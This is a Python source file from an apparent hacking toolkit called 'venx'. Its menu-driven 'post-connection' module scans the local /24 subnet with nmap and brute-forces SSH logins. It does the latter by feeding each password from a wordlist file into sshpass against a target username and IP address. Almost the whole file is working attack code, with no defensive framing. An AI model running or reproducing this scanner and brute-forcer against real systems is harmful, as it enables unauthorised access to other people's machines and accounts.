import os,sys,subprocess,time,random
import src.constants as cs
import time    
class post_connection:
    def __init__(self) -> None:
        self.ip=''
        self.username=''
        self.path_to_wordlist='psw/pass.txt'
    def get_input(self):
        input_get=input(f"{cs.bold_pink}venx-->{cs.no_color}")
        return input_get
    def clear_screen(self):
        subprocess.run("clear")
    def file_exist(self,file):
        if os.path.exists(file):
            return True
        else:
            return False

    #Post-connection attacks here
    def scan(self):
        # Run the route command and store its output
        ip_process = subprocess.Popen(["route", "-n"], stdout=subprocess.PIPE)
        ip_output = ip_process.communicate()[0].decode("utf-8")

        # Use the output of route command as input for grep
        grep_process = subprocess.run(["grep", "^0.0.0.0"], input=ip_output, text=True, stdout=subprocess.PIPE)

        # Use the output of grep as input for awk
        awk_process = subprocess.run(["awk", "{print $2}"], input=grep_process.stdout, text=True, stdout=subprocess.PIPE)

        # Print the result
        gateway_ip=awk_process.stdout.strip()
        print(f"Your gateway: {awk_process.stdout.strip()}")

        ip_oct=gateway_ip.split(".")
        j=0
        ip_range=''
        for i in ip_oct:
            if j == 3:
                ip_range= ip_range + "." + "0/24"
            elif j == 0:
                ip_range=ip_range + i
            else:
                ip_range =ip_range + "."+ i
            j+=1

        subprocess.run(["nmap",ip_range])
    def ssh_bruteforce(self):
        self.clear_screen()
        self.show_post_connection_navbar()
        username=input("Enter target username: ")
        print(username)
        ip = input("Enter target ip address: ")
        print(ip)
        self.username=username
        self.ip=ip
        print("Attack initializing....")
        time.sleep(1.5)
        with open(self.path_to_wordlist, 'r') as file:
            for line in file:
                password=line.strip()
                # ssh=f"sshpass -p {password} ssh {username}@{ip}"
                # cmd=f"xterm -geometry '100x25+600+0' -hold -e bash -c '{ssh}'"
                ssh=f"{username}@{ip}"
                subprocess.run(["sshpass","-p",password,"ssh",ssh])
                time.sleep(0.5)

    def show_post_connection_navbar(self):
        ip=self.ip
        username=self.username
        print("\n")
        print(f"{cs.bold_white}IPv4:{cs.bold_green}{ip}{cs.bold_white}  Username:{username}  Wordlist:{cs.bold_green}{self.path_to_wordlist}")
        print("\n")

    def show_post_connection_menu(self):
        self.show_post_connection_navbar()
        options =["scan network","ssh bruteforce"]
        for i in options:
            print(f"{cs.bold_blue}{options.index(i)}. {i}")
        print("\n")
        option_is_set=False
        while option_is_set == False:
            try:
                choise=int(self.get_input())
                if choise == 0:
                    self.scan()
                elif choise==1:
                    self.ssh_bruteforce()
            except ValueError:
                print(f"{cs.bold_red}Input must be an integer!")

    def main(self):
        self.show_post_connection_menu()